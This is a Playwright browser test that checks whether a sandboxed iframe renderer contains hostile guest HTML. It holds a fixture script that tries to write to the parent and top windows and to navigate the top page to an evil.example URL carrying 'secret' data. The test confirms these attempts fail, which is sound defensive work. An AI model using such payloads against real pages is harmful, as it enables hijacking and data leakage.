import { test, expect } from '@playwright/test';
import {
  buildTier2FrameDocument,
  TIER2_FRAME_ALLOW,
  TIER2_SANDBOX_TOKENS,
} from '../src/components/renderers/tier2/sandbox-frame-document';

// Proves the Tier-2 opaque-origin isolation boundary in a real browser using the
// REAL srcdoc/CSP builder and the REAL sandbox/allow attributes. A fixture
// interactive guest emits hostile HTML; the sandbox + null origin + in-document
// CSP must contain it: the script runs INSIDE the frame (it posts `ready`) yet
// cannot reach the host realm, cannot navigate the top browsing context, and
// cannot mutate host DOM. The worker transport, React frame pool, and graph
// resolver are covered by unit tests and the Bun worker smoke test; this e2e is
// the origin-isolation evidence those cannot provide.
test.describe('Tier-2 sandboxed-iframe isolation', () => {
  test('contains a hostile interactive guest inside an opaque frame', async ({ page }) => {
    await page.goto('/');

    const nonce = 'e2e-nonce-1234567890abcdef';
    // Hostile guest output: tries to take over the host, exfiltrate via top
    // navigation, and impersonate host UI. Mirrors the fixture worker guest.
    const hostileBody = [
      '<main data-fixture="interactive"><p id="marker">sandboxed</p>',
      '<script>',
      'try { window.parent.__pwned = true; } catch (e) {}',
      'try { top.__pwned = true; } catch (e) {}',
      "try { top.location.href = 'https://evil.example/?d=secret'; } catch (e) {}",
      "document.getElementById('marker').setAttribute('data-ran','1');",
      '</script></main>',
    ].join('');
    const sourceDocument = buildTier2FrameDocument(hostileBody, nonce);

    const topUrlBefore = page.url();

    const result = await page.evaluate(
      async (arguments_) => {
        const received: string[] = [];
        window.addEventListener('message', (event) => {
          const data: unknown = event.data;
          if (
            typeof data === 'object' &&
            data !== null &&
            'nonce' in data &&
            typeof data.nonce === 'string' &&
            'kind' in data &&
            data.kind === 'ready'
          ) {
            received.push(data.nonce);
          }
        });

        // A host sentinel the frame must not be able to touch.
        const sentinel = document.createElement('div');
        sentinel.id = 'host-sentinel';
        sentinel.dataset.value = 'untouched';
        document.body.append(sentinel);

        const iframe = document.createElement('iframe');
        iframe.setAttribute('sandbox', arguments_.sandbox);
        iframe.setAttribute('allow', arguments_.allow);
        iframe.srcdoc = arguments_.srcDoc;
        document.body.append(iframe);

        await new Promise((resolve) => setTimeout(resolve, 1500));

        return {
          readyNonces: received,
          pwned: '__pwned' in globalThis,
          sentinelValue: document.querySelector<HTMLElement>('#host-sentinel')?.dataset.value,
          sandboxAttr: iframe.getAttribute('sandbox'),
          allowAttr: iframe.getAttribute('allow'),
          frameCount: document.querySelectorAll('iframe').length,
        };
      },
      { srcDoc: sourceDocument, sandbox: TIER2_SANDBOX_TOKENS, allow: TIER2_FRAME_ALLOW },
    );

    // 1. The opaque frame rendered and its script ran INSIDE the frame: it posted
    //    `ready` keyed by the per-frame nonce.
    expect(result.frameCount).toBeGreaterThan(0);
    expect(result.readyNonces).toContain(nonce);

    // 2. The hostile script could NOT reach the host realm.
    expect(result.pwned).toBe(false);

    // 3. The sandbox has no allow-same-origin and an empty Permissions-Policy.
    expect(result.sandboxAttr).toBe('allow-scripts');
    expect(result.sandboxAttr?.includes('allow-same-origin')).toBe(false);
    expect(result.allowAttr).toBe('');

    // 4. The frame could not navigate the TOP browsing context (no
    //    allow-top-navigation): the host page URL is unchanged.
    expect(page.url()).toBe(topUrlBefore);

    // 5. Host DOM the frame tried to reach is untouched.
    expect(result.sentinelValue).toBe('untouched');
  });
});
